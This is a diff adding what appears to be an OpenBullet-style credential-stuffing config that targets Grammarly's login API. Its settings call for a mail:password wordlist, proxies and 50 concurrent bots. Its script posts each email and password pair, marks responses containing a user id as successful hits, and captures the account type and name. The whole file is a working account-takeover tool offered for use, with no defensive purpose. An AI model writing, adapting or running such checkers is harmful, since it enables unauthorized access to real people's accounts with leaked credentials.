@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "Grammarly || V0RT3X",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-02T10:25:48.1142768+01:00",
+  "AdditionalInfo": "",
+  "Author": "V0RT3X",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://auth.grammarly.com/v3/api/login" 
+  CONTENT "{\"email_login\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"user\":{\"id\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"FAILURE\"}" 
+PARSE "<SOURCE>" LR "type\":\"" "\"" -> CAP "Type" 
+PARSE "<SOURCE>" LR "\"name\":\"" "\"" -> CAP "Name" 
